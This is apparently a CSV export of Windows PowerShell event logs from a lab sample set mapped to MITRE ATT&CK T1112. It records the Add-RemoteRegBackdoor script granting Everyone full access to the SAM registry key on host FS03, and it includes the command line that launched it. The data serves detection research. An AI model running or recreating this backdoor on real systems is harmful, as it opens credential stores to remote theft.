RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
54,54758,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1119\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
55,54759,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1121\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
56,54760,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1123\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
57,54761,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1125\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
58,54762,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1127\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
59,54763,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1129\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
60,54764,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1131\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring completed for key\""\n"",""Binary"":""""}}"
61,54765,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        Write-Verbose \""[$Computer] Backdooring completed for system\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1133\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        Write-Verbose \""[$Computer] Backdooring completed for system\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03] Backdooring completed for system\""\n"",""Binary"":""""}}"
62,54766,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out = New-Object PSObject  \n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1135\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out = New-Object PSObject  \n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""PSObject\""\n"",""Binary"":""""}}"
63,54767,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out | Add-Member Noteproperty 'ComputerName' $Computer\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1137\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out | Add-Member Noteproperty 'ComputerName' $Computer\n, CommandInvocation(Add-Member): \""Add-Member\""\nParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\""\nParameterBinding(Add-Member): name=\""Name\""; value=\""ComputerName\""\nParameterBinding(Add-Member): name=\""Value\""; value=\""FS03\""\nParameterBinding(Add-Member): name=\""InputObject\""; value=\""\""\n"",""Binary"":""""}}"
64,54768,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1139\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee\n, CommandInvocation(Add-Member): \""Add-Member\""\nParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\""\nParameterBinding(Add-Member): name=\""Name\""; value=\""BackdoorTrustee\""\nParameterBinding(Add-Member): name=\""Value\""; value=\""S-1-1-0\""\nParameterBinding(Add-Member): name=\""InputObject\""; value=\""@{ComputerName=FS03}\""\n"",""Binary"":""""}}"
65,54769,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1141\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\nParameterBinding(Out-Default): name=\""InputObject\""; value=\""@{ComputerName=FS03; BackdoorTrustee=S-1-1-0}\""\n"",""Binary"":""""}}"
66,68900,2021-12-09 19:54:03.2614286,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0',,,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0'""},{""@Name"":""ScriptBlockId"",""#text"":""29a865ee-6911-418f-be84-57e7a06f5129""}]}}"
67,68901,2021-12-09 19:54:03.2614286,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : ] Using trustee username 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : ] Using trustee username 'Everyone'\"", ""}]}}"
68,68902,2021-12-09 19:54:03.3707924,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Get-WmiObject,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Get-WmiObject): ""Get-WmiObject"", ParameterBinding(Get-WmiObject): name=""Class""; value=""Win32_Service"", ParameterBinding(Get-WmiObject): name=""Filter""; value=""name='RemoteRegistry'"", ParameterBinding(Get-WmiObject): name=""ComputerName""; value=""FS03"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Get-WmiObject): \""Get-WmiObject\"", ParameterBinding(Get-WmiObject): name=\""Class\""; value=\""Win32_Service\"", ParameterBinding(Get-WmiObject): name=\""Filter\""; value=\""name='RemoteRegistry'\"", ParameterBinding(Get-WmiObject): name=\""ComputerName\""; value=\""FS03\"", ""}]}}"
